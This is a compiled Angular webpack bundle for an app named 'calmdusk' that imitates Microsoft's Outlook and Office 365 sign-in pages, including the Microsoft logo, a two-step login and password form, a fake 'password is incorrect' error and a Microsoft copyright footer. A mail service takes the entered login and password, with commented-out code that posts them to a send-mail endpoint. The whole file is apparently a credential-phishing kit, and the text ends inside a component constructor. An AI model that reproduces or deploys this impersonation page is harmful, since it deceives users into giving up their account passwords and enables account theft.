(window["webpackJsonp"] = window["webpackJsonp"] || []).push([["main"],{

/***/ "./src/$$_lazy_route_resource lazy recursive":
/*!**********************************************************!*\
  !*** ./src/$$_lazy_route_resource lazy namespace object ***!
  \**********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

function webpackEmptyAsyncContext(req) {
	// Here Promise.resolve().then() is used instead of new Promise() to prevent
	// uncaught exception popping up in devtools
	return Promise.resolve().then(function() {
		var e = new Error("Cannot find module '" + req + "'");
		e.code = 'MODULE_NOT_FOUND';
		throw e;
	});
}
webpackEmptyAsyncContext.keys = function() { return []; };
webpackEmptyAsyncContext.resolve = webpackEmptyAsyncContext;
module.exports = webpackEmptyAsyncContext;
webpackEmptyAsyncContext.id = "./src/$$_lazy_route_resource lazy recursive";

/***/ }),

/***/ "./src/app/app-routing.module.ts":
/*!***************************************!*\
  !*** ./src/app/app-routing.module.ts ***!
  \***************************************/
/*! exports provided: AppRoutingModule */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppRoutingModule", function() { return AppRoutingModule; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./outlook/outlook.component */ "./src/app/outlook/outlook.component.ts");
/* harmony import */ var _office365_office365_component__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./office365/office365.component */ "./src/app/office365/office365.component.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};




var routes = [
    { path: "", redirectTo: 'outlook', pathMatch: "full" },
    { path: "outlook", component: _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_2__["OutlookComponent"] },
    { path: "office365", component: _office365_office365_component__WEBPACK_IMPORTED_MODULE_3__["Office365Component"] }
];
var AppRoutingModule = /** @class */ (function () {
    function AppRoutingModule() {
    }
    AppRoutingModule = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["NgModule"])({
            imports: [_angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"].forRoot(routes)],
            exports: [_angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"]]
        })
    ], AppRoutingModule);
    return AppRoutingModule;
}());



/***/ }),

/***/ "./src/app/app.component.css":
/*!***********************************!*\
  !*** ./src/app/app.component.css ***!
  \***********************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL2FwcC5jb21wb25lbnQuY3NzIn0= */"

/***/ }),

/***/ "./src/app/app.component.html":
/*!************************************!*\
  !*** ./src/app/app.component.html ***!
  \************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<router-outlet></router-outlet>\n"

/***/ }),

/***/ "./src/app/app.component.ts":
/*!**********************************!*\
  !*** ./src/app/app.component.ts ***!
  \**********************************/
/*! exports provided: AppComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppComponent", function() { return AppComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};

var AppComponent = /** @class */ (function () {
    function AppComponent() {
        this.title = 'calmdusk';
    }
    AppComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-root',
            template: __webpack_require__(/*! ./app.component.html */ "./src/app/app.component.html"),
            styles: [__webpack_require__(/*! ./app.component.css */ "./src/app/app.component.css")]
        })
    ], AppComponent);
    return AppComponent;
}());



/***/ }),

/***/ "./src/app/app.module.ts":
/*!*******************************!*\
  !*** ./src/app/app.module.ts ***!
  \*******************************/
/*! exports provided: AppModule */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppModule", function() { return AppModule; });
/* harmony import */ var _angular_platform_browser__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/platform-browser */ "./node_modules/@angular/platform-browser/fesm5/platform-browser.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/forms */ "./node_modules/@angular/forms/fesm5/forms.js");
/* harmony import */ var _app_routing_module__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./app-routing.module */ "./src/app/app-routing.module.ts");
/* harmony import */ var _app_component__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./app.component */ "./src/app/app.component.ts");
/* harmony import */ var _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./outlook/outlook.component */ "./src/app/outlook/outlook.component.ts");
/* harmony import */ var _office365_office365_component__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./office365/office365.component */ "./src/app/office365/office365.component.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};








var AppModule = /** @class */ (function () {
    function AppModule() {
    }
    AppModule = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["NgModule"])({
            declarations: [
                _app_component__WEBPACK_IMPORTED_MODULE_5__["AppComponent"],
                _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_6__["OutlookComponent"],
                _office365_office365_component__WEBPACK_IMPORTED_MODULE_7__["Office365Component"]
            ],
            imports: [
                _angular_platform_browser__WEBPACK_IMPORTED_MODULE_0__["BrowserModule"],
                _angular_common_http__WEBPACK_IMPORTED_MODULE_2__["HttpClientModule"],
                _angular_forms__WEBPACK_IMPORTED_MODULE_3__["FormsModule"],
                _angular_forms__WEBPACK_IMPORTED_MODULE_3__["ReactiveFormsModule"],
                _app_routing_module__WEBPACK_IMPORTED_MODULE_4__["AppRoutingModule"]
            ],
            providers: [],
            bootstrap: [_app_component__WEBPACK_IMPORTED_MODULE_5__["AppComponent"]]
        })
    ], AppModule);
    return AppModule;
}());



/***/ }),

/***/ "./src/app/mail.service.ts":
/*!*********************************!*\
  !*** ./src/app/mail.service.ts ***!
  \*********************************/
/*! exports provided: MailService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "MailService", function() { return MailService; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


// import { HttpParamsOptions, HttpParams } from '@angular/common/http/src/params';
var MailService = /** @class */ (function () {
    function MailService(httpClient) {
        this.httpClient = httpClient;
    }
    MailService.prototype.postOutlookLogins = function (login, password) {
        console.log("pa iajfisa");
        // let httpHeaders = new HttpHeaders({
        //   "content-type":"application/json"
        // });
        // let options = {
        //   headers: httpHeaders
        // };
        // let body = {
        //   params: {
        //     'login': login,
        //     'password': password
        //   }
        // };
        // return  this.httpClient.post("http://localhost:3000/send-mail",
        // body).subscribe(()=> {
        //   console.log(body)
        // });
    };
    MailService = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Injectable"])({
            providedIn: 'root'
        }),
        __metadata("design:paramtypes", [_angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpClient"]])
    ], MailService);
    return MailService;
}());



/***/ }),

/***/ "./src/app/office365/office365.component.css":
/*!***************************************************!*\
  !*** ./src/app/office365/office365.component.css ***!
  \***************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".office365-wrapper {\r\n    width: 100%;\r\n    height: 100vh;\r\n    background-image: url('background.jpg');\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: center;\r\n}\r\n.microsoft-logo {\r\n    margin-top: 20px;\r\n}\r\n.main {\r\n    width: 400px;\r\n    min-height: 300px;\r\n    background-color: white;\r\n    display: flex;\r\n    flex-direction: column;\r\n    padding: 20px 20px;\r\n}\r\nh1 {\r\n    font-size: 25px;\r\n    font-weight: 600;\r\n    margin: 20px 0;\r\n}\r\ninput {\r\n    padding: 5px 5px;\r\n    line-height: 20px;\r\n    border: none;\r\n    font-size: 14px;\r\n    margin-top: 10px;\r\n    font-weight: normal;\r\n    width: auto;\r\n}\r\n.password-error, .login-error {\r\n        font-size: 16px;\r\n        font-weight: normal;\r\n        color: red;\r\n}\r\n.w3-input {\r\n    border-bottom: black;\r\n}\r\n.noaccount {\r\n    font-size: .8rem;\r\n    font-weight: 400;\r\n}\r\n.next {\r\n    display: flex;\r\n    width: 100px;\r\n    background-color: #005da6;\r\n    height: 30px;\r\n    justify-content: center;\r\n    align-items: center;\r\n    color: white;\r\n    align-self: flex-end;\r\n    margin-top: 60px;\r\n    font-weight: 300;\r\n    font-size: 14px;\r\n}\r\nfooter{\r\n    width: 100%;\r\n    height: 35px;\r\n    display: flex;\r\n    color: white;\r\n    background-color: rgba(0,0,0,.7);\r\n    font-size: 13px;\r\n    justify-content: flex-end;\r\n    align-items: center;\r\n    padding-right: 10px;\r\n    \r\n    position: fixed;\r\n    bottom: 0;\r\n    \r\n}\r\n.features {\r\n    margin-left: 15px;\r\n    font-weight: 400;\r\n}\r\n.password-section {\r\n    background-color: white;\r\n    /* margin-top: 90px; */\r\n    width: 100%;\r\n    display: flex;\r\n    flex-direction: column;\r\n}\r\na {\r\n    color: rgb(122, 122, 216);\r\n    width: 100%;\r\n    margin-top: 10px;\r\n    font-size: 15px;\r\n}\r\n@media screen and (max-width: 600px) {\r\n    .main {\r\n        width: 100%;\r\n        height: 100vh;\r\n        padding: 40px 15px;\r\n        display: flex;\r\n\r\n\r\n    }\r\n    footer {\r\n        background-color: white;\r\n        color: black;\r\n    }\r\n}\r\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvb2ZmaWNlMzY1L29mZmljZTM2NS5jb21wb25lbnQuY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0lBQ0ksWUFBWTtJQUNaLGNBQWM7SUFDZCx3Q0FBcUQ7SUFDckQsY0FBYztJQUNkLG9CQUFvQjtJQUNwQix3QkFBd0I7Q0FDM0I7QUFDRDtJQUNJLGlCQUFpQjtDQUNwQjtBQUNEO0lBQ0ksYUFBYTtJQUNiLGtCQUFrQjtJQUNsQix3QkFBd0I7SUFDeEIsY0FBYztJQUNkLHVCQUF1QjtJQUN2QixtQkFBbUI7Q0FDdEI7QUFDRDtJQUNJLGdCQUFnQjtJQUNoQixpQkFBaUI7SUFDakIsZUFBZTtDQUNsQjtBQUNEO0lBQ0ksaUJBQWlCO0lBQ2pCLGtCQUFrQjtJQUNsQixhQUFhO0lBQ2IsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtJQUNqQixvQkFBb0I7SUFDcEIsWUFBWTtDQUNmO0FBQ0Q7UUFDUSxnQkFBZ0I7UUFDaEIsb0JBQW9CO1FBQ3BCLFdBQVc7Q0FDbEI7QUFDRDtJQUNJLHFCQUFxQjtDQUN4QjtBQUNEO0lBQ0ksaUJBQWlCO0lBQ2pCLGlCQUFpQjtDQUNwQjtBQUNEO0lBQ0ksY0FBYztJQUNkLGFBQWE7SUFDYiwwQkFBMEI7SUFDMUIsYUFBYTtJQUNiLHdCQUF3QjtJQUN4QixvQkFBb0I7SUFDcEIsYUFBYTtJQUNiLHFCQUFxQjtJQUNyQixpQkFBaUI7SUFDakIsaUJBQWlCO0lBQ2pCLGdCQUFnQjtDQUNuQjtBQUNEO0lBQ0ksWUFBWTtJQUNaLGFBQWE7SUFDYixjQUFjO0lBQ2QsYUFBYTtJQUNiLGlDQUFpQztJQUNqQyxnQkFBZ0I7SUFDaEIsMEJBQTBCO0lBQzFCLG9CQUFvQjtJQUNwQixvQkFBb0I7O0lBRXBCLGdCQUFnQjtJQUNoQixVQUFVOztDQUViO0FBQ0Q7SUFDSSxrQkFBa0I7SUFDbEIsaUJBQWlCO0NBQ3BCO0FBQ0Q7SUFDSSx3QkFBd0I7SUFDeEIsdUJBQXVCO0lBQ3ZCLFlBQVk7SUFDWixjQUFjO0lBQ2QsdUJBQXVCO0NBQzFCO0FBQ0Q7SUFDSSwwQkFBMEI7SUFDMUIsWUFBWTtJQUNaLGlCQUFpQjtJQUNqQixnQkFBZ0I7Q0FDbkI7QUFDRDtJQUNJO1FBQ0ksWUFBWTtRQUNaLGNBQWM7UUFDZCxtQkFBbUI7UUFDbkIsY0FBYzs7O0tBR2pCO0lBQ0Q7UUFDSSx3QkFBd0I7UUFDeEIsYUFBYTtLQUNoQjtDQUNKIiwiZmlsZSI6InNyYy9hcHAvb2ZmaWNlMzY1L29mZmljZTM2NS5jb21wb25lbnQuY3NzIiwic291cmNlc0NvbnRlbnQiOlsiLm9mZmljZTM2NS13cmFwcGVyIHtcclxuICAgIHdpZHRoOiAxMDAlO1xyXG4gICAgaGVpZ2h0OiAxMDB2aDtcclxuICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybChcIi4uLy4uL2Fzc2V0cy9iYWNrZ3JvdW5kLmpwZ1wiKTtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xyXG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XHJcbn1cclxuLm1pY3Jvc29mdC1sb2dvIHtcclxuICAgIG1hcmdpbi10b3A6IDIwcHg7XHJcbn1cclxuLm1haW4ge1xyXG4gICAgd2lkdGg6IDQwMHB4O1xyXG4gICAgbWluLWhlaWdodDogMzAwcHg7XHJcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xyXG4gICAgcGFkZGluZzogMjBweCAyMHB4O1xyXG59XHJcbmgxIHtcclxuICAgIGZvbnQtc2l6ZTogMjVweDtcclxuICAgIGZvbnQtd2VpZ2h0OiA2MDA7XHJcbiAgICBtYXJnaW46IDIwcHggMDtcclxufVxyXG5pbnB1dCB7XHJcbiAgICBwYWRkaW5nOiA1cHggNXB4O1xyXG4gICAgbGluZS1oZWlnaHQ6IDIwcHg7XHJcbiAgICBib3JkZXI6IG5vbmU7XHJcbiAgICBmb250LXNpemU6IDE0cHg7XHJcbiAgICBtYXJnaW4tdG9wOiAxMHB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IG5vcm1hbDtcclxuICAgIHdpZHRoOiBhdXRvO1xyXG59XHJcbi5wYXNzd29yZC1lcnJvciwgLmxvZ2luLWVycm9yIHtcclxuICAgICAgICBmb250LXNpemU6IDE2cHg7XHJcbiAgICAgICAgZm9udC13ZWlnaHQ6IG5vcm1hbDtcclxuICAgICAgICBjb2xvcjogcmVkO1xyXG59XHJcbi53My1pbnB1dCB7XHJcbiAgICBib3JkZXItYm90dG9tOiBibGFjaztcclxufVxyXG4ubm9hY2NvdW50IHtcclxuICAgIGZvbnQtc2l6ZTogLjhyZW07XHJcbiAgICBmb250LXdlaWdodDogNDAwO1xyXG59XHJcbi5uZXh0IHtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICB3aWR0aDogMTAwcHg7XHJcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA1ZGE2O1xyXG4gICAgaGVpZ2h0OiAzMHB4O1xyXG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XHJcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xyXG4gICAgY29sb3I6IHdoaXRlO1xyXG4gICAgYWxpZ24tc2VsZjogZmxleC1lbmQ7XHJcbiAgICBtYXJnaW4tdG9wOiA2MHB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IDMwMDtcclxuICAgIGZvbnQtc2l6ZTogMTRweDtcclxufVxyXG5mb290ZXJ7XHJcbiAgICB3aWR0aDogMTAwJTtcclxuICAgIGhlaWdodDogMzVweDtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBjb2xvcjogd2hpdGU7XHJcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwwLC43KTtcclxuICAgIGZvbnQtc2l6ZTogMTNweDtcclxuICAgIGp1c3RpZnktY29udGVudDogZmxleC1lbmQ7XHJcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xyXG4gICAgcGFkZGluZy1yaWdodDogMTBweDtcclxuICAgIFxyXG4gICAgcG9zaXRpb246IGZpeGVkO1xyXG4gICAgYm90dG9tOiAwO1xyXG4gICAgXHJcbn1cclxuLmZlYXR1cmVzIHtcclxuICAgIG1hcmdpbi1sZWZ0OiAxNXB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IDQwMDtcclxufVxyXG4ucGFzc3dvcmQtc2VjdGlvbiB7XHJcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTtcclxuICAgIC8qIG1hcmdpbi10b3A6IDkwcHg7ICovXHJcbiAgICB3aWR0aDogMTAwJTtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xyXG59XHJcbmEge1xyXG4gICAgY29sb3I6IHJnYigxMjIsIDEyMiwgMjE2KTtcclxuICAgIHdpZHRoOiAxMDAlO1xyXG4gICAgbWFyZ2luLXRvcDogMTBweDtcclxuICAgIGZvbnQtc2l6ZTogMTVweDtcclxufVxyXG5AbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiA2MDBweCkge1xyXG4gICAgLm1haW4ge1xyXG4gICAgICAgIHdpZHRoOiAxMDAlO1xyXG4gICAgICAgIGhlaWdodDogMTAwdmg7XHJcbiAgICAgICAgcGFkZGluZzogNDBweCAxNXB4O1xyXG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XHJcblxyXG5cclxuICAgIH1cclxuICAgIGZvb3RlciB7XHJcbiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7XHJcbiAgICAgICAgY29sb3I6IGJsYWNrO1xyXG4gICAgfVxyXG59Il19 */"

/***/ }),

/***/ "./src/app/office365/office365.component.html":
/*!****************************************************!*\
  !*** ./src/app/office365/office365.component.html ***!
  \****************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"office365-wrapper\">\n  <div class=\"main\">\n    <div class=\"microsoft-logo\">\n      <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"108\" height=\"24\" viewBox=\"0 0 108 24\"><title>assets</title><path d=\"M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z\" fill=\"#737373\"/><rect width=\"10.931\" height=\"10.931\" fill=\"#f25022\"/><rect x=\"12.069\" width=\"10.931\" height=\"10.931\" fill=\"#7fba00\"/><rect y=\"12.069\" width=\"10.931\" height=\"10.931\" fill=\"#00a4ef\"/><rect x=\"12.069\" y=\"12.069\" width=\"10.931\" height=\"10.931\" fill=\"#ffb900\"/></svg>\n    \n    </div>\n    <section *ngIf=\"signinPage\">\n          <h1>sign in</h1>\n          <span class=\"login-error\" *ngIf=\"loginError\">Your account or password is incorrect.</span>\n        <input type=\"text\" #loginInput class=\"w3-input\" placeholder=\"Email, Phone and skype\" [(ngModel)]=\"login\" >\n        <div class=\"noaccount\">No Acount? \n          <a>Create One?</a>\n        </div>\n        <a class=\"next\" (click)=\"getLogin()\">Next</a>\n    </section>\n    <section class=\"password-section\" *ngIf= \"!signinPage\"  >\n      <div class=\"usser-login\">\n        <i class=\"fa fa-arrow-left\"></i>\n        {{login}}\n      </div>\n      <h1>Enter password</h1>\n      <span class=\"password-error\" *ngIf=\"passwordErrorMessage\">Your account or password is incorrect.</span>\n      <input type=\"password\"  [(ngModel)]= \"password\" placeholder=\"Password\">\n      <label>\n        <input type=\"checkbox\" value=\"Keep me signed in\">\n        <span>Keep me signed in</span>\n      </label>\n      <a>Forgot my password</a> \n      <a>This isnt my origin</a>\n      <a>Sign in with a different microsoft account</a>\n      <a class=\"next\" (click)=\"getPassword()\">Sign in</a>\n\n    </section>\n    \n  </div>\n  <footer>\n    <div class=\"features\">2018 Microsoft</div>\n    <div class=\"features\">Terms of use</div>\n    <div class=\"features\">Privacy and cookies</div>\n  </footer>\n</div>"

/***/ }),

/***/ "./src/app/office365/office365.component.ts":
/*!**************************************************!*\
  !*** ./src/app/office365/office365.component.ts ***!
  \**************************************************/
/*! exports provided: Office365Component */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "Office365Component", function() { return Office365Component; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _mail_service__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../mail.service */ "./src/app/mail.service.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


var Office365Component = /** @class */ (function () {
    function Office365Component(mailService) {
        this.mailService = mailService;
        this.login = "";
        this.password = "";
        this.signinPage = true;
        this.loginError = false;
        this.passwordErrorMessage = false;
        this.passwordEntries = 1;
    }
